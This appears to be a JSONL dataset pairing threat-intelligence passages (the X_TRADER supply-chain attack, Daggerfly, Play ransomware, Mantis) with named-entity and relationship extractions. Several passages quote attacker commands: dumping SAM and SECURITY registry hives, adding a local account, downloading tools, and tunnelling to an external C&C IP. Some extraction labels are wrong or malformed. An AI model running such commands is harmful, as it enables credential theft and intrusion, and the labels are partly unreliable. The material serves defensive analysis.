{"instruction": "Malicious Installer The infection chain starts with the Trojanized installer named X_TRADER_r7.17.90p608.exe (SHA256: 900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), which is digitally signed by \"Trading Technologies International, Inc.\" and contains a malicious executable named Setup.exe. Our analysis of one version of this executable (SHA256: aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43) found that when executed, it examined the file named X_TRADER-ja.mst (also contained in the installer) for the following marker bytes at hardcoded offset 0x167000: 5E DA F3 76 If the marker bytes are present, it creates a folder named: C:\\Programdata\\TPM It then copies the file C:\\Windows\\Sysnative\\immersivetpmvscmgrsvr.exe as C:\\Programdata\\TPM\\TpmVscMgrSvr.exe to the new folder. Next, it will drop two malicious DLLs: C:\\Programdata\\TPM\\winscard.dll (SHA256: cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2) C:\\Programdata\\TPM\\msvcr100.dll (SHA256: d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0) The content of the dropped files is generated by decrypting chunks of the file X_TRADER-ja.mst mentioned earlier using the XOR algorithm with the following key: 74 F2 39 DA E5 CF", "input": null, "output": "Named Entities: (X_TRADER_r7.17.90p608.exe, file), (900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6, SHA256), (Setup.exe, file), (aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43, SHA256), (X_TRADER-ja.mst, file), (winscard.dll, file), (cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2, SHA256), (msvcr100.dll, file), (d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0, SHA256)\nRelationships: (attack, start from, X_TRADER_r7.17.90p608.exe), (X_TRADER_r7.17.90p608.exe, hash,  900b63ff9b06e0890bf642bdfcbfcc6ab7887c7a3c057c8e3fd6fba5ffc8e5d6), (X_TRADER_r7.17.90p608.exe, contain, Setup.exe), (Setup.exe, hash, aa318070ad1bf90ed459ac34dc5254acc178baff3202d2ea7f49aaf5a055dd43), (X_TRADER_r7.17.90p608.exe, examine, X_TRADER-ja.mst), (X_TRADER_r7.17.90p608.exe, drop, winscard.dll), (winscard.dll, hash, cc4eedb7b1f77f02b962f4b05278fa7f8082708b5a12cacf928118520762b5e2), (X_TRADER_r7.17.90p608.exe, drop, msvcr100.dll), (msvcr100.dll, hash, d937e19ccb3fd1dddeea3eaaf72645e8cd64083228a0df69c60820289b1aa3c0)"}
{"instruction": "To achieve persistence on the victim\u2019s system, the malware invokes a CLSID_TaskScheduler COM object, possibly to create a scheduled task to run periodically the following file: C:\\Programdata\\TPM\\TpmVscMgrSvr.exe Setup.exe then drops a file named X_TRADER.exe, also contained within the installer. The content of the dropped file is generated by decrypting chunks from one of its own portable executable resources starting at hardcoded offset 0x1CB40 using the XOR algorithm with the following key: 74 F2 39 DA E5 CF Setup will then execute X_Trader.exe before deleting itself.", "input": null, "output": "Named Entities: (malware, malware), (TpmVscMgrSvr.exe, file), (X_TRADER.exe, file)\nRelationships: (malware, run, TpmVscMgrSvr.exe), (malware, drop, X_TRADER.exe)"}
{"instruction": "Backdoor Installation Once installed, the legitimate X_Trader executable side-loads the two malicious DLLs dropped by the installer. The first, winscard.dll, acts as a loader and contains code that will load and execute a payload from the second (msvcr100.dll). The msvcr100.dll file contains an encrypted blob appended to the file. The blob starts with the hex value FEEDFACE, which the loader uses to find the blob. The process for payload installation is almost identical as that seen with the Trojanized 3CX app, where two side-loaded DLLs are used to extract a payload from an encrypted blob.", "input": null, "output": "Named Entities: (X_Trader, malware), (winscard.dll, file), (msvcr100.dll, file)\nRelationships: (X_Trader, drop, winscard.dll), (winscard.dll, load, msvcr100.dll)"}
{"instruction": "In this attack, the payload extracted is a modular backdoor called Veiledsignal (SHA256: e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345). Veiledsignal contains another DLL (SHA256: 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), which is a process-injection module. This can be injected into the Chrome, Firefox, or Edge web browsers. The module contains a second DLL (SHA256: f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), which is a command-and-control (C&C) module. It connects to the following C&C URL: https://www.tradingtechnologies.com/trading/order-management", "input": null, "output": "Named Entities: (Veiledsignal, malware), (e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345, SHA256), (19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae, SHA256), (f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce, SHA256), (https://www.tradingtechnologies.com/trading/order-management, URL)\nRelationships: (Veiledsignal,hash, e185c99b3d1085aed9fda65a9774abd73ecf1229f14591606c6c59e9660c4345), (Veiledsignal, contains, 19442d9e476e3ef990ce57b683190301e946ccb28fc88b69ab53a93bf84464ae), (Veiledsignal, contains, f8c370c67ffb3a88107c9022b17382b5465c4af3dd453e50e4a0bd3ae9b012ce), (Veiledsignal, connect, https://www.tradingtechnologies.com/trading/order-management)"}
{"instruction": "Hydra-like Campaign \nThe discovery that 3CX was breached by another, earlier supply chain attack made it highly likely that further organizations would be impacted by this campaign, which now transpires to be far more wide-ranging than originally believed. The attackers behind these breaches clearly have a successful template for software supply chain attacks and further, similar attacks cannot be ruled out.", "input": null, "output": "No related named entitie and relationships."}
{"instruction": "Daggerfly: APT Actor Targets Telecoms Company in Africa", "input": null, "output": "Named Entities: (Daggerfly, attacker), (APT, threat type)\nRelationships: (Daggerfly, belong to, APT)"}
{"instruction": "New MgBot malware framework plugins deployed in recent campaign. A telecommunications organization in Africa appears to be among the latest targets for the Daggerfly (aka Evasive Panda, Bronze Highland) advanced persistent threat (APT) group, with the group\u2019s most recent campaign using previously unseen plugins from the MgBot malware framework. The first indications of malicious activity on this victim\u2019s network were seen in November 2022, but there are indications the activity is likely still ongoing. Researchers from the Threat Hunter Team at Symantec, by Broadcom Software , found multiple unique plugins associated with the MgBot modular malware framework on the victim\u2019s network. The attackers were also seen using a PlugX loader and abusing the legitimate AnyDesk remote desktop software. Use of the MgBot modular malware framework and PlugX loader have been associated in the past with China-linked APTs.", "input": null, "output": "Named Entities: (MgBot, malware), (Daggerfly, attacker), (Evasive Panda, attacker), (Bronze Highland, attacker), (APT, threat type), (AnyDesk, tool),(PlugX loader, tool), (China-linked APTs, attacker)\nRelationships: (MgBot, associated with, Daggerfly), (Daggerfly, aka, Evasive Panda), (Daggerfly, aka, Bronze Highland), (Daggerfly, used, MgBot), (Daggerfly, use, PlugX loader), (Daggerfly, used, AnyDesk), (MgBot, associated with, China-linked APTs)"}
{"instruction": "Association between this activity and Daggerfly is based in part on details in a 2020 blog about activity that Malwarebytes attributed to Evasive Panda . Crossovers in the activity included: One of the MgBot samples found appears in both sets of activity Both sets of activity include a renamed Rundll32.exe file named \"dbengin.exe\" in the ProgramData\\Microsoft\\PlayReady directory The loader DLL \"pMsrvd.dll\" in the csidl_common_appdata\\microsoft\\playready\\mdie942.tmp directory appears in both sets of activity The folders and file names used in this recent activity, as well as the use of DLL side-loading, also support the attribution. The activity documented by Malwarebytes occurred in 2020, and Daggerfly is believed to have been active since at least 2014.", "input": null, "output": "Named Entities: (Daggerfly, attacker), (Evasive Panda, attacker), (MgBot, malware), (Rundll32.exe, file), (dbengin.exe, file)\nRelationships: (MgBot, appears in, Daggerfly), (MgBot, appears in, Evasive Panda), (Daggerfly, include, Rundll32.exe), (Evasive Panda, include, Rundll32.exe), (Rundll32.exe, renamed, dbengin.exe)"}
{"instruction": "Attack Chain Suspicious AnyDesk connections spotted on a Microsoft Exchange mail server in November 2022 were among the first signs of suspicious activity on the victim network targeted in this recent Daggerfly activity. AnyDesk is a legitimate remote desktop software but it is commonly abused by threat actors for remote access and other purposes. The WannaMine crypto-mining malware was also seen on the same Exchange server, though it appears likely that this activity was not linked to the Daggerfly group. The presence of WannaMine, however, does indicate that the server it was found on may have been unpatched and vulnerable to the EternalBlue exploit, as well as more recent exploits targeting this web server. The legitimate, free Rising antivirus software was also used to side-load the PlugX loader onto victim machines. We will go through the attack chain in further detail below. File downloads", "input": null, "output": "Named Entities: (AnyDesk, tool), (Daggerfly, attacker), (WannaMine, malware), (PlugX loader, tool)\nRelationships: (Daggerfly, use, AnyDesk)"}
{"instruction": "Threat actors used the living-off-the-land tools BITSAdmin and PowerShell to download files onto victim systems. The attackers downloaded the legitimate AnyDesk executable and the GetCredManCreds tool in this way. Commands used by the attackers to download remote desktop access tools onto victim machines bitsadmin /transfer d7d3 https://download.anydesk.com/AnyDesk.exe CSIDL_COMMON_APPDATA\\anydesk.exe \u201cCSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe\" Invoke-WebRequest -Uri https://download.anydesk.com/AnyDesk.exe -OutFile CSIDL_COMMON_APPDATA\\anydesk.exe Credential dumping The attackers used the previously downloaded GetCredManCreds script to retrieve the usernames and passwords of web services stored in the credential manager using PowerShell. Commands used by the attackers to download credential dumping tools onto victim machines \"CSIDL_SYSTEM\\windowspowershell\\v1.0\\powershell.exe\" Invoke-WebRequest -Uri https://raw.githubusercontent.com/VimalShekar/PowerShell/master/GetCredmanCreds.ps1 -OutFile CSIDL_COMMON_APPDATA\\a.ps1 They also dumped the SAM (Security Account Manager), System, and Security hives of the Windows registry using the reg.exe tool. This allowed the adversaries to extract credentials from the SAM database. Commands used by the attackers to steal credentials \"CSIDL_SYSTEM\\reg.exe\" save hklm\\sam sam.save \"CSIDL_SYSTEM\\reg.exe\" save hklm\\system system.save \"CSIDL_SYSTEM\\reg.exe\" save hklm\\security security.save", "input": null, "output": "Named Entities: (BITSAdmin, tool), (PowerShell, tool), (AnyDesk, tool), (GetCredManCreds, tool)\nRelationships: (threat actors, use, BITSAdmin), (threat actors, use, PowerShell), (BITSAdmin, download, AnyDesk), (BITSAdmin, download, GetCredManCreds), (PowerShell, download, AnyDesk), (PowerShell, download, GetCredManCreds)"}
{"instruction": "Persistence with local account Daggerfly also created a local account to maintain access to victim systems with the following command line: \"CSIDL_SYSTEM\\net.exe\" user [REDACTED] Pqssword1 /add MgBot modular malware framework MgBot is a well-designed modular framework that is actively maintained. The components of the framework are the following: MgBot EXE dropper MgBot DLL Loader MgBot Plugins The MgBot plugins that were deployed in this activity have numerous capabilities that can provide the attackers with a significant amount of information about compromised machines. Among the unique plugins that were deployed during this activity were: Network scanner \u2013 innocence.dll Capabilities include: arp scan, http scan, determining the type of server (e.g. SQL, WebLogic, Redis, etc.) it is running on. A Chrome and Firefox infostealer that can gather information such as bookmarks and browsing history \u2013 bkmk.dll Logging module \u2013 famdowm.dll", "input": null, "output": "Named Entities: (Daggerfly, attacker), (MgBot, malware), (MgBot EXE, tool), (MgBot DLL Loader, tool), (MgBot Plugins, tool), (innocence.dll, file), (Chrome and Firefox infostealer, tool), (bkmk.dll, file), (famdowm.dll, file)\nRelationships: (Daggerfly, use, MgBot), (MgBot, have, MgBot EXE dropper), (MgBot, have, MgBot DLL Loader), (MgBot, have, MgBot Plugins), (MgBot, deploy,  innocence.dll), (MgBot Plugins, deploy, bkmk.dll), (MgBot Plugins, deploy, famdowm.dll)"}
{"instruction": "Based on the open-source easylogging++ , which can carry out basic logging, track performance and more. QQ messages infostealer \u2013 qmsdp.dll Based on this blog , which details how a chat tool message database was cracked by hackers. Active Directory enumeration \u2013 ceeeb.dll Collects the following information from Active directory: Members info Computers Local Admins Remote Desktop Users Dcom Users Password dumper \u2013 cpfwplgx.dll Drops a file to call the MiniDumpWriteDump API to dump a process memory. QQ Keylogger \u2013 kstrcs.dll Keylogger that targets QQEdit.exe and QQ.exe processes. Screen and clipboard grabber \u2013 cbmrpa.dll Captures clipboard and drag and drop data and saves it to a file. Outlook and Foxmail credentials stealer \u2013 maillfpassword.dll Audio capture \u2013 prsm.dll Captures audio from the infected system. Uses COM objects IMMDeviceEnumerator, IAudioCaptureClient. Process Watchdog \u2013 ansecprocesskeep.dll Registered as service AnsecProcessKeep. Confirmed to be a watchdog that keeps a process running.", "input": null, "output": "Named Entities: (qmsdp.dll, file), (ceeeb.dll, file), (cpfwplgx.dll, file), (kstrcs.dll, file), (cbmrpa.dll, file), (maillfpassword.dll, file), (prsm.dll, file), (ansecprocesskeep.dll, file)\nRelationships: No related relations."}
{"instruction": "The process name is found in an .ini file. All of these capabilities would have allowed the attackers to collect a significant amount of information from victim machines. The capabilities of these plugins also show that the main goal of the attackers during this campaign was information-gathering. Daggerfly\u2019s development of these previously unseen plugins demonstrates that the attack group is continuing to actively develop its malware and the tools it can use to target victim networks.", "input": null, "output": "Named Entities: (Daggerfly, attacker)\nRelationships: (Daggerfly, develop, plugins), (Daggerfly, use, malware)"}
{"instruction": "Continuation of a Trend Telecoms companies will always be a key target in intelligence gathering campaigns due to the access they can potentially provide to the communications of end-users. Symantec\u2019s Threat Hunter team also spotted some other recent activity targeting telecoms companies that was linked with moderate confidence to the threat actor Othorene (aka Gallium), in what appeared to be a continuation of an intelligence-gathering campaign first reported on by SentinelOne under the name Operation Tainted Love in March . SentinelOne reported that in that campaign Othorene was targeting telecoms companies in the Middle East.", "input": null, "output": "Named Entities: (Othorene, attacker), (Gallium, attacker)\nRelationships: (Othorene, aka, Gallium)"}
{"instruction": "Othorene has been active since around 2014, and it is believed to be a relatively small group that has a strong focus on the surveillance of individuals. There are some indications that Othorene may have links with the APT41 (aka Blackfly, Grayfly) APT group also. Overlap of both personnel and tactics, techniques, and procedures (TTPs) among Chinese APT groups is not uncommon, and can mean that attributing activity to one group with high confidence is difficult. In the activity Symantec saw, we found three additional victims of the same campaign that SentinelOne detailed, located in Asia and Africa. Two of the three were subsidiaries of the same Middle Eastern telecoms firm. The attackers had been active on victim networks since November 2022. Symantec saw attackers dumping credentials and scanning the network using NbtScan.", "input": null, "output": "Named Entities: (Othorene, attacker), (APT41, attacker), (Blackfly, attacker), (Grayfly, attacker), (NbtScan, tool)\nRelationships: (Othorene, links with, APT41), (APT41, aka, Blackfly), (APT41, aka, Grayfly), (Othorene, use, NbtScan)"}
{"instruction": "The main malware (pc.exe dubbed mim221) in this campaign was used to dump credentials, and it had the same password as the malware used in the activity documented by SentinelOne. The attackers also moved laterally across victims\u2019 networks, used Scheduled Task for persistence, and dumped SAM and System hives from the registry. There were indications that the attackers may have exported the Active Directory database on victim machines, and they were also able to gain access to domain controllers, giving them deep access to victim networks.", "input": null, "output": "Named Entities: (pc.exe, file), (mim221, malware), (SentinelOne, attacker)\nRelationships: (mim221, file, pc.exe)"}
{"instruction": "Play Ransomware Group Using New Custom Data-Gathering Tools", "input": null, "output": "Named Entities: (Play Ransomware Group, attacker), (Custom Data-Gathering Tools, tool)\nRelationships: (Play Ransomware Group, use, Custom Data-Gathering Tools)"}
{"instruction": "Tools allow attackers to harvest data typically locked by the operating system. \nThe Play ransomware group is using two new, custom-developed tools that allow it to enumerate all users and computers on a compromised network, and copy files from the Volume Shadow Copy Service (VSS) that are normally locked by the operating system.", "input": null, "output": "Named Entities: (Play ransomware group, attacker)\nRelationships: No related relations."}
{"instruction": "Grixba The first tool found by researchers at Symantec, by Broadcom Software , was Grixba (Infostealer.Grixba), which is a network-scanning tool used to enumerate all users and computers in the domain. The threat actors use the .NET infostealer to enumerate software and services via WMI, WinRM, Remote Registry, and Remote Services. The malware checks for the existence of security and backup software, as well as remote administration tools and other programs, saving the gathered information in CSV files that are compressed into a ZIP file for subsequent manual exfiltration by the threat actors.", "input": null, "output": "Named Entities: (Grixba, tool), (Infostealer.Grixba, malware),  \nRelationships: (Grixba, have, (Infostealer.Grixba)"}
{"instruction": "The Play ransomware gang developed Grixba using Costura , a popular.NET development tool for embedding an application's dependencies into a single executable file. This eliminates the requirement for the program and its dependencies to be deployed separately, making it easier to share and deploy the application. Costura embeds into applications the DLL file costura.commandline.dll, which is used by Grixba to parse command lines. An analysis of a Grixba sample by Symantec revealed the following help message and functionality: Help message Figure 1. Help screen displayed by Grixba malware Scan mode The Scan mode enumerates software and services via WMI, WinRM, Remote Registry, and Remote Services. It then checks for the existence of the following security programs: Defence Defender Endpoint AntiVirus BitDefender Kaspersky Norton Avast WebRoo AVG ESET Malware Defender Sophos Trend Symantec Endpoint Protection Security McAfee TotalAV pcprotect scanguard Crowdstrike Harmony SentinelOne MVISION WithSecure WatchGuard FireEye FSecure Carbon Black Heimdal", "input": null, "output": "Named Entities: (Play ransomware gang, attacker), (Grixba, malware), (Costura, tool), (.NET development tool, tool), (costura.commandline.dll, file)\nRelationships: (Play ransomware gang, developed, Grixba), (Grixba, used, Costura), (Costura, is, .NET development tool), (Costura, file, costura.commandline.dll)"}
{"instruction": "HitmanPro VIPRE Anti-Virus DeepArmor Morphisec Dr.Web It also checks for the existence of the following backup software: Veeam Backup Recovery Synology C2 Cloud Dropbox Acronis Cobian EaseUS Paragon IDrive It then checks for the existence of the following remote administration tools: VNC Remote AnyDesk TeamViewer NinjaOne Zoho Atera ConnectWise RemotePC GoTo Resolve GoToAssist Splashtop SOS BeyondTrust Remote Desktop Manager Getscreen Action1 Webex Atlassian Surfly Electric Pulseway Kaseya VSA XMReality SightCall DameWare ScreenMeet Viewabo ShowMyPC Iperius Radmin Remote Utilities RemoteToPC Finally, it checks for the existence of the following programs: Hitachi Storage Navigator Modular .NET Office Adobe Word Excel Java Office Learning DirectX PowerPoint The malware then saves all the information in CSV files and, using WinRAR, compresses them to a file named export.zip. List of CSV files compressed by Grixba: alive.csv wm.csv soft.csv all_soft.csv mount.csv users.csv remote_svc.csv cached_RDP.csv Scanall mode", "input": null, "output": "Named Entities: (HitmanPro, tool), (VIPRE Anti-Virus, tool), (DeepArmor, tool), (Morphisec, tool), (Dr.Web, tool), (Veeam Backup Recovery, tool), (Synology C2 Cloud, tool), (Dropbox, tool), (Acronis, tool), (Cobian, tool), (EaseUS, tool), (Paragon, tool), (IDrive, tool), (VNC Remote, tool), (AnyDesk, tool), (TeamViewer, tool), (NinjaOne, tool), (Zoho, tool), (Atera, tool), (ConnectWise, tool), (RemotePC, tool), (GoTo Resolve, tool), (GoToAssist, tool), (Splashtop, tool), (SOS BeyondTrust, tool), (Remote Desktop Manager, tool), (Getscreen, tool), (Action1 Webex, tool), (Atlassian Surfly, tool), (Electric Pulseway, tool), (Kaseya VSA, tool), (XMReality, tool), (SightCall, tool), (DameWare, tool), (ScreenMeet, tool), (Viewabo, tool), (ShowMyPC, tool), (Iperius, tool), (Radmin, tool), (Remote Utilities, tool), (RemoteToPC, tool), (WinRAR, tool), (Grixba, malware), (export.zip, file)\nRelationships: (Grixba, checks for existence of, HitmanPro), (Grixba, checks for existence of, VIPRE Anti-Virus), (Grixba, checks for existence of, DeepArmor), (Grixba, checks for existence of, Morphisec), (Grixba, checks for existence of, Dr.Web), (Grixba, checks for existence of, Veeam Backup Recovery), (Grixba, checks for existence of, Synology C2 Cloud), (Grixba, checks for existence of, Dropbox), (Grixba, checks for existence of, Acronis), (Grixba, checks for existence of, Cobian), (Grixba, checks for existence of, EaseUS), (Grixba, checks for existence of, Paragon), (Grixba, checks for existence of, IDrive), (Grixba, checks for existence of, VNC Remote), (Grixba, checks for existence of, AnyDesk), (Grixba, checks for existence of, TeamViewer), (Grixba, checks for existence of, NinjaOne), (Grixba, checks for existence of, Zoho), (Grixba, checks for existence of, Atera), (Grixba, checks for existence of, ConnectWise), (Grixba, checks for existence of, RemotePC), (Grixba, checks for existence of, GoTo Resolve), (Grixba, checks for existence of, GoToAssist), (Grixba, checks for existence of, Splashtop), (Grixba, checks for existence of, SOS BeyondTrust), (Grixba, checks for existence of, Remote Desktop Manager), (Grixba, checks for existence of, Getscreen), (Grixba, checks for existence of, Action1 Webex), (Grixba, checks for existence of, Atlassian Surfly), (Grixba, checks for existence of, Electric Pulseway), (Grixba, checks for existence of, Kaseya VSA), (Grixba, checks for existence of, XMReality), (Grixba, checks for existence of, SightCall), (Grixba, checks for existence of, DameWare), (Grixba, checks for existence of, ScreenMeet), (Grixba, checks for existence of, Viewabo), (Grixba, checks for existence of, ShowMyPC), (Grixba, checks for existence of, Iperius), (Grixba, checks for existence of, Radmin), (Grixba, checks for existence of, Remote Utilities), (Grixba, checks for existence of, RemoteToPC), (Grixba, compresses, export.zip)"}
{"instruction": "Scanall mode is similar to Scan mode, but scans for a broader list of programs. Clr mode Clr mode deletes the logs from local and remote computers. It also enumerates the following registry keys: SYSTEM\\\\CurrentControlSet\\\\services\\\\eventlog SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels It uses the APIs \"EvtOpenLog\" and \"EvtClearLog\" to delete the logs and deletes the WMI activity logs from the event source \"Microsoft-Windows-WMI-Activity\".", "input": null, "output": "No related entities and relations."}
{"instruction": "VSS Copying Tool The Play ransomware gang was also recently observed using another .NET executable, which was also developed with the Costura tool. Costura embeds the library AlphaVSS into executables. The AlphaVSS library is a.NET framework that provides a high-level interface for interacting with VSS. The library makes it easier for .NET programs to interface with VSS by offering a set of controlled APIs. Developers can use these APIs to generate, manage, and delete shadow copies, as well as access information about existing shadow copies such as size and status.", "input": null, "output": "Named Entities: (Play ransomware gang, attacker), (VSS Copying Tool, tool), (Costura, tool)\nRelationships: (Play ransomware gang, use, VSS Copying Tool), ((VSS Copying Tool, developed with, Costura)"}
{"instruction": "The tool created by the Play ransomware operators uses AlphaVSS to copy files from VSS snapshots. The tool enumerates the files and folders in a VSS snapshot and copies them to a destination directory. The tool allows the attackers to copy files from VSS volumes on compromised machines prior to encryption. This allows the threat actors to copy files that would normally be locked by the operating system.", "input": null, "output": "Named Entities: (Play ransomware, malware), (AlphaVSS, tool)\nRelationships: (Play ransomware, uses, AlphaVSS)"}
{"instruction": "Play Ransomware Background Play ransomware (also known as PlayCrypt), which is developed by a group Symantec tracks as Balloonfly, was launched in June 2022, and since then has been responsible for multiple high-profile attacks. Like most ransomware groups now, Play carries out double-extortion attacks, where the attackers exfiltrate data from victim networks before encrypting them. While the ransomware gang had an initial focus on organizations in Latin America, especially Brazil, it soon widened its targeting. Play is known for targeting Microsoft Exchange vulnerabilities ( CVE-2022-41080 , CVE-2022-41082 ), as well as other flaws, to gain remote code execution (RCE) and infiltrate victim networks. The group was also one of the first ransomware groups to employ intermittent encryption , a technique that allows for faster encryption of victims\u2019 systems. The tactic consists of encrypting only parts of the targeted files' content, which would still render the data unrecoverable.", "input": null, "output": "Named Entities: (Play Ransomware, malware), (PlayCrypt, malware), (Balloonfly, attacker), (CVE-2022-41080, vulnerability), (CVE-2022-41082, vulnerability)\nRelationships: (Play Ransomware, known as, PlayCrypt))(Play Ransomware, developed by, Balloonfly), (Play Ransomware, targeting, CVE-2022-41080), (Play Ransomware, targeting, CVE-2022-41082)"}
{"instruction": "Play is also notable as it doesn\u2019t appear to operate as a ransomware-as-a-service, with Balloonfly seemingly carrying out the ransomware attacks as well as developing the malware.", "input": null, "output": "Named Entities: (Play, malware), (ransomware-as-a-service, threat type), (Balloonfly, attacker)\nRelationships: (Play, not operate as, ransomware-as-a-service), (Balloonfly, carry out, ransomware attacks)"}
{"instruction": "Use of Custom Tools on the Rise \nCustom tools are increasingly being used by ransomware gangs in their attacks. This is likely due to a number of reasons, such as making attacks more efficient and reducing dwell time. Custom tools can be tailored to a specific target environment, allowing ransomware gangs to carry out attacks faster and more efficiently. The use of proprietary tools also gives ransomware operators more control over their operations. If a tool is widely available, it can be reverse-engineered or adapted by other attackers, potentially weakening the initial attack's effectiveness. By keeping their tools proprietary and exclusive, ransomware gangs can maintain their competitive advantage and maximize their profits.", "input": null, "output": "Named Entities: (Custom Tools, tool), (ransomware, threat type)\nRelationships: (Custom Tools, is used by, ransomware gangs)"}
{"instruction": "Mantis: New Tooling Used in Attacks Against Palestinian Targets", "input": null, "output": "Named Entities: (Mantis, attacker)\nRelationships: No related relations."}
{"instruction": "Espionage group puts time and effort into avoiding detection and maintaining persistent presence on compromised networks. \nThe Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories , is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks. \nWhile the group is known for targeting organizations in the Middle East, the most recent campaign uncovered by Symantec, by Broadcom Software , focused on organizations within the Palestinian territories, with malicious activity beginning in September 2022 and continuing to at least February 2023. This targeting is not unprecedented for Mantis and Symantec previously uncovered attacks against individuals located in the Palestinian territories during 2017.", "input": null, "output": "Named Entities: (Mantis, attacker), (Arid Viper, attacker), (Desert Falcon, attacker), (APT-C-23, attacker)\nRelationships: (Mantis, aka, Arid Viper), (Mantis, aka, Desert Falcon), (Mantis, aka, APT-C-23)"}
{"instruction": "Background \nMantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices. \nMantis is widely accepted to be linked to the Palestinian territories. While other vendors have linked the group to Hamas , Symantec cannot make a definitive attribution to any Palestinian organization. \nIn its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.", "input": null, "output": "Named Entities: (Mantis, attacker), (Hamas, attacker), (Micropsia, tool), (Arid Gopher backdoors, tool)\nRelationships:  (Mantis, linked to, Hamas), (Mantis, use, Micropsia), (Mantis, use, Arid Gopher backdoors)"}
{"instruction": "Attack chain The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target\u2019s network. The following is a description of how one of those three toolsets was used: The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444.", "input": null, "output": "Named Entities: (PowerShell, tool), (104.194.222[.]50, IP)\nRelationships: (malware, connect, 104.194.222[.]50)"}
{"instruction": "The attackers returned on December 19 to dump credentials before downloading the Micropsia backdoor and Putty, a publicly available SSH client , using Certutil and BITSAdmin Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name: csidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe csidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe csidl_common_appdata\\windowsps\\windowsps.exe On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address: CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED] On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers. The following day, December 21, RAR was executed to archive files on another infected computer.", "input": null, "output": "Named Entities: (Micropsia, malware), (Putty, malware), (Certutil, tool), (BITSAdmin, tool), (systempropertiesinternationaltime.exe, file), (windowsnetworkmanager.exe, file), (windowsps.exe, file), (windowsservicemanageav.exe, file), (104.194.222[.]50:443, IP), (windowspackages.exe, file)\nRelationships: (attacker, download, Micropsia), (attacker, download, Putty), (attacker, using, Certutil), (attacker, using, BITSAdmin), (Micropsia, ran, systempropertiesinternationaltime.exe), (Micropsia, ran, windowsnetworkmanager.exe), (Micropsia, ran, windowsps.exe), (Micropsia, use, windowsservicemanageav.exe), (windowsservicemanageav.exe, connect, 104.194.222[.]50:443), (Micropsia, execute, windowspackages.exe)"}
{"instruction": "Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers). On December 28, Micropsia was used to run windowspackages.exe on three more infected computers. On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers. On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear.", "input": null, "output": "Named Entities: (Micropsia, malware), (Arid Gopher, malware), (SetRegRunKey.exe, file), (localsecuritypolicy.exe, file), (windowspackages.exe, file), (networkswitcherdatamodell.exe, file), (networkuefidiagsbootserver.exe, file)\nRelationships: (Micropsia, execute, Arid Gopher), (Arid Gopher, run, SetRegRunKey.exe), (Arid Gopher, run, localsecuritypolicy.exe), (Micropsia, run, windowspackages.exe), (Arid Gopher, execute, networkswitcherdatamodell.exe), (Arid Gopher, execute, networkuefidiagsbootserver.exe), (attackers, retire, Arid Gopher)"}
